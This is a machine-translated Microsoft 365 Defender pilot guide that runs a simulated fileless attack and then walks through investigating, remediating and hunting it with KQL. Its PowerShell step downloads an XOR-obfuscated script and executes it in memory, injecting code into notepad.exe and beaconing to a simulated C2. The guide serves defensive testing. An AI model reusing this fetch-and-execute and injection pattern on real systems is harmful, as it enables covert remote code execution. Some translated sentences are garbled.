---
title: 运行攻击Microsoft 365 Defender模拟
description: 为试点Microsoft 365 Defender攻击模拟，以查看其展开方式并快速修复。
keywords: Microsoft 365 Defender试点攻击模拟，运行 Microsoft 365 Defender 试点攻击模拟，模拟 Microsoft 365 Defender、 Microsoft 365 Defender 试点项目中的攻击、网络安全、高级永久性威胁、企业安全、设备、设备、标识、用户、数据、应用程序、事件、自动调查和修正、高级搜寻
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 48195345b21b409b175d68acdc25d9f2fc4fc5f1
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 06/30/2021
ms.locfileid: "53230015"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>运行攻击Microsoft 365 Defender模拟

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![规划](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[规划](m365d-pilot-plan.md)|[![准备](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[准备](prepare-m365d-eval.md)|![模拟攻击](../../media/phase-diagrams/3-simluate.png)<br/>模拟攻击|[![结束和汇总](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[结束和汇总](m365d-pilot-close.md)|
|--|--|--|--|
|||*你在这里！*||

你当前处于攻击模拟阶段。

准备试点环境后，可以测试事件管理Microsoft 365 Defender自动调查和修正功能。 我们将帮助你模拟复杂的攻击，该攻击利用高级技术在检测中隐藏。 该攻击枚举域控制器上打开 (SMB) 会话，并检索用户设备的最新 IP 地址。 此类攻击通常不包括在被攻击的设备上丢弃的文件，它们仅出现在内存中。 他们通过使用现有系统和管理工具"离开陆地"，将其代码注入系统进程以隐藏其执行，此类行为允许他们规避检测并保留在设备上。

在此模拟中，我们的示例方案从 PowerShell 脚本开始。 用户可能会被欺骗运行脚本。 或者，脚本可能从远程连接从以前受感染的设备（尝试在网络中进行后向移动的攻击者）从远程连接运行到另一台计算机。 检测这些脚本可能很困难，因为管理员通常还远程运行脚本以执行各种管理活动。

![使用进程注入和 SMB 重新连接攻击图表的无文件 PowerShell 攻击](../../media/mtp/mtpdiydiagram.png)

在模拟过程中，该攻击将 shellcode 注入一个看起来不一样的过程。 此方案需要使用notepad.exe。 我们选择了此过程进行模拟，但攻击者更有可能针对长时间运行的系统进程，例如svchost.exe。 然后，shellcode 继续联系攻击者的命令和控制 (C2) 服务器，以接收有关如何继续的说明。 该脚本尝试对 DC 服务器中的域控制器 (重新) 。 重新集成允许攻击者获取有关最近用户登录信息的信息。 一旦攻击者获得此信息，他们就可以在网络中进行稍后移动，以到达特定的敏感帐户

> [!IMPORTANT]
> 为了获得最佳结果，请尽可能遵循攻击模拟说明。

## <a name="simulation-environment-requirements"></a>模拟环境要求

由于已在准备阶段配置了试点环境，因此请确保有两个设备用于此方案：测试设备和域控制器。

1. 验证租户是否[已启用Microsoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)

2. 验证测试域控制器配置：

   - 设备使用 Windows Server 2008 R2 或更高版本运行。
   - 测试域控制器到 [Microsoft Defender 的标识并](/azure/security-center/security-center-wdatp) 启用 [远程管理](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。
   - 验证是否[已启用 Microsoft Defender 的标识Microsoft Cloud App Security集成](/cloud-app-security/mdi-integration)。
   - 在域中创建测试用户 - 无需管理员权限。

3. 验证测试设备配置：

   1. 设备使用 Windows 10版本 1903 或更高版本运行。

   1. 测试设备已加入测试域。

   1. [打开"Windows Defender 防病毒"。](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) 如果无法启用Windows Defender 防病毒，请参阅此[疑难解答主题](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。

   1. 验证测试设备已载入[Microsoft Defender 终结点) 。 ](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

如果使用现有租户并实施设备组，请为测试设备创建专用设备组，并推送到配置 UX 中的顶层。

## <a name="run-the-attack-scenario-simulation"></a>运行攻击方案模拟

运行攻击方案模拟：

1. 使用测试用户帐户登录到测试设备。

2. 在测试Windows PowerShell打开一个"打开"窗口。

3. 复制以下模拟脚本：

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > 如果在 Web 浏览器中打开此文档，则可能无法复制全文而不丢失某些字符或引入额外的换行符。 下载此文档，在 Adobe Reader 上打开它。

4. 在提示符下，粘贴并运行复制的脚本。

> [!NOTE]
> 如果使用远程桌面协议 (RDP) 运行 PowerShell，请使用 RDP 客户端中的"键入剪贴板文本"命令，因为 **CTRL-V** 热键或右键单击粘贴方法可能不起作用。 PowerShell 的最新版本有时也不接受该方法，您可能首先必须复制到内存中的 记事本，将其复制到虚拟机中，然后将其粘贴到 PowerShell 中。

几秒钟后，notepad.exe<i>打开。</i> 模拟攻击代码将注入到notepad.exe。 将自动生成的记事本实例保持打开状态，以体验完整方案。

模拟攻击代码将尝试与外部 IP 地址通信 (模拟 C2 服务器) 然后尝试通过 SMB 重新对域控制器进行重新连接。

此脚本完成后，你将看到 PowerShell 控制台上显示的消息。

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

To see the Automated Incident and Response feature in action， keep the notepad.exe process open. 你将看到自动事件和响应停止记事本进程。

## <a name="investigate-an-incident"></a>调查事件

> [!NOTE]
> 在我们演示此模拟之前，请观看以下视频，了解事件管理如何有助于将相关警报作为调查过程的一部分一起处理，在哪里可以找到门户中的警报，以及如何帮助你执行安全操作：

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

切换到 SOC 分析员的角度，你现在可以在安全中心门户中开始Microsoft 365攻击。

1. 从任何[Microsoft 365打开安全中心](https://security.microsoft.com/incidents)门户事件队列。

2. 从 **菜单导航到** "事件"。

    ![事件屏幕截图，如Microsoft 365安全中心的左侧菜单上所示](../../media/mtp/fig1.png)

3. 模拟攻击的新事件将显示在事件队列中。

    ![事件队列的屏幕截图](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>将攻击作为单个事件进行调查

Microsoft 365 Defender分析关联，并将不同产品的相关警报和调查聚合到一个事件实体中。 通过执行此操作，Microsoft 365 Defender更广泛的攻击案例，让 SOC 分析师可以了解和响应复杂的威胁。

此模拟期间生成的警报与同一威胁相关联，因此，自动聚合为单个事件。

查看事件：

1. 导航到 **事件** 队列。

   ![导航菜单中的事件屏幕截图](../../media/mtp/fig1.png)

2. 单击事件名称左侧的圆圈，选择最新项。 侧面板显示有关事件的其他信息，包括所有相关警报。 每个事件都有一个唯一的名称，该名称根据事件包括的警报的属性进行描述。

   ![在模拟期间聚合生成的警报的事件页面的屏幕截图](../../media/mtp/fig4.png)

   可以基于以下服务资源筛选显示在仪表板中的警报：Microsoft Defender for Identity、Microsoft Cloud App Security、Microsoft Defender for Endpoint、Microsoft 365 Defender 和 Microsoft Defender for Office 365。

3. 选择 **"打开事件** 页面"获取有关事件详细信息。

   在 **"事件** "页中，你可以看到与事件相关的所有警报和信息。 该信息包括警报中涉及的实体和资产、警报的检测源 (Microsoft Defender for Identity、EDR) ，以及它们链接在一起的原因。 查看事件警报列表将显示攻击进度。 从此视图中，你可以查看和调查各个警报。

   您还可以从右侧 **菜单中** 单击"管理事件"，以标记事件、将其分配给自己并添加注释。

   ![单击"管理事件"位置的屏幕截图](../../media/mtp/fig5a.png)

   ![可在管理事件面板上标记事件、将其分配给自己并添加注释的字段的屏幕截图](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>查看生成的警报

让我们看一下模拟攻击期间生成的一些警报。

> [!NOTE]
> 我们将仅演练模拟攻击期间生成的一些警报。 根据测试设备上Windows的 Microsoft 365 Defender 版本，你可能会看到按略有不同的顺序显示更多警报。

![生成的警报的屏幕截图](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>警报：发现可疑进程注入 (源：Microsoft Defender for Endpoint EDR) 

高级攻击者使用复杂而复杂的方法来保留内存，并隐藏在检测工具中。 一种常见技术是在受信任的系统进程（而不是恶意可执行文件）内进行操作，使得检测工具和安全操作难以发现恶意代码。

为了允许 SOC 分析师捕获这些高级攻击，Microsoft Defender for Endpoint 中的深度内存传感器为云服务提供了对各种跨进程代码注入技术的前所未有的可见性。 下图显示了在尝试向终结点注入代码时如何检测到 Defender for Endpoint 并<i>notepad.exe。 </i>

![有关注入潜在恶意代码的警报的屏幕截图](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>警报：进程在运行时观察到的意外行为，没有命令行参数 (Source： Microsoft Defender for Endpoint EDR) 

Microsoft Defender 终结点检测通常针对攻击技术最常见的属性。 此方法可确保持续性，并提升攻击者切换到较新策略的漏洞。

我们采用大规模学习算法来建立组织和全球通用流程的正常行为，并观察这些流程何时显示异常行为。 这些异常行为通常指示已引入多余的代码，并且正在其他受信任进程中运行。

对于此方案 <i> ，notepad.exe</i> 出现异常行为，包括与外部位置的通信。 此结果独立于用于引入和执行恶意代码的特定方法。

> [!NOTE]
> 由于此警报基于需要额外后端处理的机器学习模型，因此在门户中看到此警报可能需要一些时间。

请注意，警报详细信息包括外部 IP 地址，该地址是一个可用于扩展调查的指示器。

选择警报进程树中的 IP 地址以查看 IP 地址详细信息页面。

![无命令行参数的进程运行时出现意外行为警报的屏幕截图](../../media/mtp/fig8.png)

下图显示了选中的 IP 地址详细信息页面 (警报进程树中的 IP 地址) 。
![IP 地址详细信息页面的屏幕截图](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>警报：SMB 用户和 IP 地址重新 (源)  (：Microsoft Defender for Identity) 

使用服务器消息块 (SMB) 协议的枚举使攻击者能够获取最近的用户登录信息，这些信息可帮助他们稍后通过网络移动来访问特定的敏感帐户。

在此检测中，当 SMB 会话枚举针对域控制器运行时，将触发警报。

![用户和 IP 地址重新重发的 Microsoft Defender 标识警报屏幕截图](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>查看设备时间线 [Microsoft Defender for Endpoint]

在浏览此事件中的各个警报后，导航回之前调查的事件页面。 选择 **事件页面中** 的"设备"选项卡，查看 Microsoft Defender for Endpoint 和 Microsoft Defender for Identity 报告的事件所涉及的设备。

选择执行攻击的设备的名称，以打开该特定设备的实体页面。 在此页面中，你可以看到触发的警报和相关事件。

选择 **"时间线** "选项卡以打开设备时间线，并按时间顺序查看在设备上观测到的所有事件和行为，这些事件和行为与所引发警报的交错。

![具有行为的设备时间线屏幕截图](../../media/mtp/fig11.png)

展开一些更有趣的行为可提供有用的详细信息，例如进程树。

例如，向下滚动，直到找到警报事件"可疑 **进程注入已观测到"。** 选择 **powershell.exe** 以notepad.exe进程事件，以在侧窗格的"事件实体"图下显示此行为的完整进程树。  如有必要，使用搜索栏进行筛选。

![所选 PowerShell 文件创建行为的进程树屏幕截图](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>查看用户信息 [Microsoft Cloud App Security]

在事件页面上，选择" **用户** "选项卡以显示攻击所涉及的用户列表。 该表包含有关每个用户的其他信息，包括每个用户的调查 **优先级** 分数。

选择用户名以打开用户配置文件页，可在其中执行进一步调查。 [阅读更多有关调查有风险的用户。](/cloud-app-security/tutorial-ueba#identify)

![用户云应用安全屏幕截图](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>自动调查和修复

> [!NOTE]
>在我们演示此模拟之前，请观看以下视频，以熟悉什么是自动自我修复、在门户中在哪里找到它，以及它在安全操作中如何提供帮助：

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

在安全中心门户中Microsoft 365事件。 " **事件"** 页中的"调查 **"选项卡显示** 由 Microsoft Defender for Identity 和 Microsoft Defender for Endpoint 触发的自动调查。 以下屏幕截图仅显示 Defender for Endpoint 触发的自动调查。 默认情况下，Defender for Endpoint 会自动修正队列中找到的项目，这需要进行修正。

![与事件相关的自动调查的屏幕截图](../../media/mtp/fig14.png)

选择触发调查的警报以打开" **调查详细信息"** 页。 你将看到以下详细信息：

- 警报 (自动) 调查的警报。
- 影响的用户和设备。 如果在其他设备上找到指示器，这些附加设备也将列出。
- 证据列表。 找到并分析的实体，如文件、进程、服务、驱动程序和网络地址。 将分析这些实体与警报的可能关系，并评分为恶意或恶意。
- 找到的威胁。 在调查过程中发现的已知威胁。

> [!NOTE]
> 根据时间，自动调查可能仍在运行。 请等待几分钟，等待该过程完成，然后收集并分析证据并查看结果。 刷新 **"调查详细信息** "页，获取最新结果。

!["调查详细信息"页的屏幕截图](../../media/mtp/fig15.png)

在自动调查期间，Microsoft Defender for Endpoint 确定了notepad.exe，该流程作为需要修正的项目之一注入。 作为自动修正的一部分，Defender for Endpoint 会自动停止可疑进程注入。

你可以看到 <i>notepad.exe在 </i> 测试设备上正在运行的进程列表中消失。

## <a name="resolve-the-incident"></a>解决事件

完成调查并确认要修正后，关闭事件。

选择 **"管理事件"。** 将状态设置为 **"解决事件"** 并选择相关分类。

事件解决后，它将关闭安全中心和相关门户Microsoft 365警报。

!["事件"页面的屏幕截图，其中打开"管理事件"面板，可在其中单击开关来解决事件](../../media/mtp/fig16.png)

这为事件管理和自动调查和修正方案封装了攻击模拟。 下一次模拟将让你通过主动威胁搜寻潜在恶意文件。

## <a name="advanced-hunting-scenario"></a>高级搜寻方案

> [!NOTE]
> 在我们演示模拟之前，请观看以下视频，了解高级搜寻概念，了解可在门户中查找它的地方，并了解它可以如何帮助你执行安全操作：

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>搜寻环境要求

此方案需要单个内部邮箱和设备。 你还需要一个外部电子邮件帐户来发送测试邮件。

1. 验证租户是否已启用[Microsoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)
2. 确定用于接收电子邮件的目标邮箱。
    a. Microsoft Defender 必须监视此邮箱，Office 365 b。 要求 3 中的设备需要访问此邮箱
3. 配置测试设备：a. 确保使用的是 Windows 10 1903 或更高版本。
    b. 将测试设备加入测试域。
    c. [打开"Windows Defender 防病毒"。](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) 如果无法启用Windows Defender 防病毒，请参阅[此疑难解答主题](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
    d. [载入到 Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

### <a name="run-the-simulation"></a>运行模拟

1. 从外部电子邮件帐户，将电子邮件发送到测试环境要求部分的步骤 2 中标识的邮箱。 包括任何现有电子邮件筛选器策略允许的附件。 此文件不需要是恶意文件或可执行文件。 建议的文件类型包括.pdf、.exe(（如果) ）或Office Word 文件等文档。 <i> </i> <i></i>
2. 打开从设备发送的电子邮件，如测试环境要求部分的步骤 3 中的定义。 打开附件或将文件保存到设备。

#### <a name="go-hunting"></a>转到搜寻

1. 打开 security.microsoft.com 门户。

2. 导航到 **"搜寻>高级搜寻"。**

   ![M365 安全中心门户导航栏中高级搜寻的屏幕截图](../../media/mtp/fig17.png)

3. 生成一个查询，该查询从收集电子邮件事件开始。

   1. 从查询窗格中，选择"新建"。

   1. 双击架构中的 EmailEvents 表。

      ```console
      EmailEvents
      ```

   1. 将时间范围更改为过去 24 小时。 假设你运行上述模拟时发送的电子邮件是过去 24 小时发送的，否则请更改时间范围。

      ![你可以更改时间范围的屏幕截图。 打开下拉菜单以从时间范围选项中进行选择](../../media/mtp/fig18.png)

   1. 运行查询。 根据试点的环境，你可能会获得许多结果。

      > [!NOTE]
      > 有关限制数据返回的筛选选项，请参阅下一步。

      ![高级搜寻查询结果的屏幕截图](../../media/mtp/fig19.png)

        > [!NOTE]
        > 高级搜寻将查询结果显示为表格数据。 还可以选择查看其他格式类型（如图表）的数据。

   1. 查看结果，并查看能否识别打开的电子邮件。 可能需要 2 小时才能在高级搜寻中显示消息。 如果电子邮件环境很大并且有很多结果，您可能需要使用"显示筛选器" **选项查找邮件** 。

      在示例中，电子邮件发送自 Yahoo 帐户。 单击 **+** SenderFromDomain **yahoo.com** 旁边的图标，然后单击"应用"将所选域添加到查询。 使用运行模拟的步骤 1 中用于发送测试邮件的域或电子邮件帐户筛选结果。 再次运行查询，获取较小的结果集验证是否从模拟中看到消息。

      ![筛选器的屏幕截图。 使用筛选器缩小搜索范围，并更快找到要查找的内容。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. 单击查询中的结果行，以便可以检查记录。

      ![选中高级搜寻结果时打开的检查记录侧面板的屏幕截图](../../media/mtp/fig21.png)

4. 现在，你已验证是否可以看到电子邮件，请为附件添加筛选器。 重点关注环境中具有附件的所有电子邮件。 对于此方案，重点关注入站电子邮件，而不是从你的环境发送的电子邮件。 删除已添加的任何筛选器以查找邮件并添加"|其中 **AttachmentCount > 0** 和 **EmailDirection**  ==  **"Inbound""**

   下面的查询将显示结果，其列表比针对所有电子邮件事件的初始查询短：

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. 接下来，包括有关附件 (，例如：文件名、哈希) 到结果集。 为此，请加入 **EmailAttachmentInfo** 表。 要用于联接的常用字段是 **NetworkMessageId** 和 **RecipientObjectId**。

   以下查询还包括一个附加行"| **项目重命名 EmailTimestamp=Timestamp**"，有助于确定与电子邮件相关的时间戳与下一步将添加的文件操作相关的时间戳。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. 接下来，使用 **EmailAttachmentInfo** 表中的 **SHA256** 值查找在终结点上发生的 **DeviceFileEvents** (文件操作，) 哈希。 此处的常用字段是附件的 SHA256 哈希。

   生成的表现在包含终结点 (Microsoft Defender for Endpoint) 的详细信息，例如设备名称、在此例中 (已执行哪些操作、已筛选为仅包括 FileCreated) 事件和存储文件的位置。 还将包含与进程关联的帐户名称。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   现在，你已创建一个查询，该查询将标识用户打开或保存附件的所有入站电子邮件。 您还可以优化此查询以筛选特定的发件人域、文件大小、文件类型等。

7. 函数是一种特殊类型的联接，它让你可以拉取关于文件的更多 TI 数据，如其普遍程度、签名者和颁发者信息等。若要获取有关文件的更多详细信息，请使用 **FileProfile** () 函数扩充：

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>创建检测

创建一个查询，用于标识要在将来是否发生警报的信息，然后可以从该查询创建自定义检测。

自定义检测将按照您设置的频率运行查询，并且查询结果将基于您选择的影响资产创建安全警报。 这些警报将关联到事件，并可以像其中一个产品生成任何其他安全警报一样进行会审。

1. 在查询页面上，删除在"开始"搜寻说明的步骤 7 中添加的第 7 行和第 8 行，然后单击"**创建检测规则"。**

   ![Screenshot of where you can click create detection rule in the advanced hunting page](../../media/mtp/fig22.png)

   > [!NOTE]
   > 如果单击 **"创建检测规则** "，并且查询中出现语法错误，将不会保存检测规则。 仔细检查查询以确保没有错误。

2. 使用允许安全团队了解警报的信息、生成警报的原因以及预期他们执行哪些操作，填写必填字段。

   ![可在其中定义警报详细信息的创建检测规则页面的屏幕截图](../../media/mtp/fig23.png)

   确保清楚填写字段，以帮助向下一位用户告知有关此检测规则警报的明智决定

3. 选择此警报中影响的实体。 在这种情况下，请选择"**设备和** 邮箱 **"。**

   ![创建检测规则页面的屏幕截图，您可以在其中选择受影响实体的参数](../../media/mtp/fig24.png)

4. 确定触发警报时应执行哪些操作。 在这种情况下，请运行防病毒扫描，但可能会执行其他操作。

   ![创建检测规则页面的屏幕截图，可在触发警报以帮助解决威胁时运行防病毒扫描](../../media/mtp/fig25.png)

5. 选择警报规则的范围。 由于此查询涉及设备，因此设备组根据 Microsoft Defender for Endpoint 上下文在此自定义检测中相关。 创建不包含设备作为受影响实体的自定义检测时，范围不适用。

   ![创建检测规则页面的屏幕截图，可在其中设置警报规则的范围，以管理对你将看到的结果的预期](../../media/mtp/fig26.png)

   对于此试点，你可能希望将此规则限制为生产环境中的测试设备的子集。

6. 选择“创建”。 然后，从 **导航面板中选择** "自定义检测规则"。

   ![菜单中的"自定义检测规则"选项的屏幕截图](../../media/mtp/fig27a.png)

   ![显示规则和执行详细信息的检测规则页面的屏幕截图](../../media/mtp/fig27b.png)

   在此页中，可以选择将打开详细信息页面的检测规则。

   ![电子邮件附件页面的屏幕截图，可在其中查看规则执行的状态、触发的警报和操作、编辑检测等](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>其他高级搜寻演练练习

若要详细了解高级搜寻，以下 Web 广播将演练 Microsoft 365 Defender 中高级搜寻的功能，以创建跨支柱查询、透视实体以及创建自定义检测和修正操作。

> [!NOTE]
> 请准备好自己的GitHub帐户，以在试点测试实验室环境中运行搜寻查询。

|Title|说明|下载 MP4|观看 YouTube|CSL 文件使用|
|---|---|---|---|---|
|第 1 节：KQL 基础知识|我们将介绍企业高级搜寻功能的基础知识Microsoft 365 Defender。 了解可用的高级搜寻数据和基本 KQL 语法和运算符。|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[第 1 部分：Git 中的 CSL 文件](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|第 2 集：加入|我们将继续了解高级搜寻数据以及如何将表联接在一起。 了解内部、外部、唯一和半联接，以及默认 Kusto innerunique 联接的细微差别。|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[第 2 部分：Git 中的 CSL 文件](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|第 3 部分：汇总、透视和可视化数据|既然我们可以筛选、操作和联接数据，现在可以开始汇总、量化、透视和可视化了。 在此剧集，我们将介绍汇总运算符和一些可在高级搜寻架构中深入其他表时执行的计算。 我们将数据集转换为可帮助改善分析的图表。|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[第 3 部分：Git 中的 CSL 文件](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|第 4 集：让我们搜寻！ 将 KQL 应用于事件跟踪|跟踪某些攻击者活动的时间！ 在此剧集中，我们将使用对 KQL 和 Microsoft 365 Defender高级搜寻的改进了解来跟踪攻击。 了解字段中用于跟踪攻击者活动的一些提示和技巧，包括网络安全的 APC 以及如何将它们应用到事件响应。|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[第 4 部分：Git 中的 CSL 文件](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>后续步骤

|![结束和摘要阶段](../../media/mtp/close.png) <br>[结束和摘要阶段](m365d-pilot-close.md)|分析你的Microsoft 365 Defender结果，将其展示给利益干系人，然后执行下一步。
|:-----|:-----|
